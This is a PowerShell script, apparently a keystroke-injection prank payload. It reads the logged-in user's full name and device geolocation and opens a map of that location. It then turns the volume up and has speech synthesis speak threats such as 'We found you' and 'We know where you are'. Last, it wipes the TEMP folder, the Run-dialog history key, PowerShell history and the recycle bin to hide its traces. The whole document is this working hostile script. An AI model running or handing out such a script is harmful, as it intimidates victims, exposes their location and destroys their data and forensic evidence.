function Get-fullName {
    try {
        $fullName = Net User $Env:username | Select-String -Pattern "Full Name"
        $fullName = ("$fullName").ToString().Replace("Full Name", "").Trim()
        Start-Sleep -Milliseconds 500 # Added delay after name retrieval
        return $fullName
    }
    catch {
        Write-Error "No name was detected"
        Start-Sleep -Seconds 1 # Delay on error
        return $env:UserName
    }
}

function Get-GeoLocation {
    try {
        Add-Type -AssemblyName System.Device
        $GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher
        $GeoWatcher.Start()
        Start-Sleep -Seconds 2 # Initial delay for geolocation start
        $timeout = 0
        while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied') -and ($timeout -lt 20)) {
            Start-Sleep -Milliseconds 500 # Increased from 100ms
            $timeout++
        }
        if ($GeoWatcher.Permission -eq 'Denied' -or $GeoWatcher.Status -ne 'Ready') {
            return "Lat:Unknown Lon:Unknown"
        }
        $coord = $GeoWatcher.Position.Location
        return "Lat:$($coord.Latitude) Lon:$($coord.Longitude)"
    }
    catch {
        return "Lat:Unknown Lon:Unknown"
    }
}

function Pause-Script {
    Add-Type -AssemblyName System.Windows.Forms
    $originalPOS = [System.Windows.Forms.Cursor]::Position.X
    $o = New-Object -ComObject WScript.Shell
    while ($true) {
        $pauseTime = 5 # Increased from 3 seconds
        if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS) {
            Start-Sleep -Seconds 1 # Final confirmation delay
            break
        }
        else {
            $o.SendKeys("{CAPSLOCK}")
            Start-Sleep -Seconds $pauseTime
        }
    }
}

# Main execution flow with added delays

Start-Sleep -Seconds 10 # Initial warm-up delay

$GL = Get-GeoLocation
$GL = $GL -split " "
$Lat = if ($GL[0] -match "Lat:(.+)") { $Matches[1] } else { "Unknown" }
$Lon = if ($GL[1] -match "Lon:(.+)") { $Matches[1] } else { "Unknown" }

Pause-Script

# Browser launch with extended delay
Start-Process "https://www.latlong.net/c/?lat=$Lat&long=$Lon"
Start-Sleep -Seconds 5 # Extended from 3 seconds

# Volume adjustment with delays
$k = [Math]::Ceiling(100/2)
$o = New-Object -ComObject WScript.Shell
for ($i = 0; $i -lt $k; $i++) {
    $o.SendKeys([char]175)
    Start-Sleep -Milliseconds 50 # Added between volume keypresses
}

# Speech synthesis with pauses
$s = New-Object -ComObject SAPI.SpVoice
$s.Rate = -2

$FN = Get-fullName

$s.Speak("We found you $FN")
Start-Sleep -Seconds 1 # Pause between phrases
$s.Speak("We know where you are")
Start-Sleep -Seconds 1
$s.Speak("We are everywhere")
Start-Sleep -Seconds 1
$s.Speak("We do not forgive, we do not forget")
Start-Sleep -Seconds 1
$s.Speak("Expect us")
Start-Sleep -Seconds 2 # Final pause before cleanup

# Cleanup with verification delays
Remove-Item "$env:TEMP\*" -Recurse -Force -ErrorAction SilentlyContinue
Start-Sleep -Seconds 1
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /va /f
Start-Sleep -Seconds 1
Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
Start-Sleep -Seconds 1
Clear-RecycleBin -Force -ErrorAction SilentlyContinue
Start-Sleep -Seconds 1
